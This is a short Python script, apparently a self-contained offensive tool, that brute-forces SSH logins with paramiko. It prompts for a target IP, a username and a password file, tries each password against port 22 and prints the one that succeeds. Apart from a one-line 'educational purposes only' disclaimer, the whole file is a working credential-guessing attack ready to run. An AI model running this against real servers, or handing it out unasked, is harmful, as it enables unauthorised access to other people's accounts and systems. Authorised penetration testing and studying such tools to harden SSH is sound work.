#!/usr/bin/python3

import paramiko

"""
This script is a simple SSH brute force tool that reads a list of passwords from a file and tries to connect to a target SSH server.

Notes: This script is for educational purposes only. Do not use on networks you do not own or have permission to test.

"""

target = str(input('Please enter target IP address: '))
username = str(input('Please enter username to bruteforce: '))
password_file = str(input('Please enter location of the password file: '))

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except Exception as e:
        print(f"Connection error: {e}")
        code = 2
    finally:
        ssh.close()
    return code

try:
    with open(password_file, 'r') as file:
        for line in file.readlines():
            password = line.strip()

            try:
                response = ssh_connect(password)

                if response == 0:
                    print('Password found: ' + password)
                    exit(0)
                elif response == 1:
                    print('No luck')
            except Exception as e:
                print(f"Error during connection attempt: {e}")
except FileNotFoundError:
    print(f"Password file not found: {password_file}")
except Exception as e:
    print(f"Error reading password file: {e}")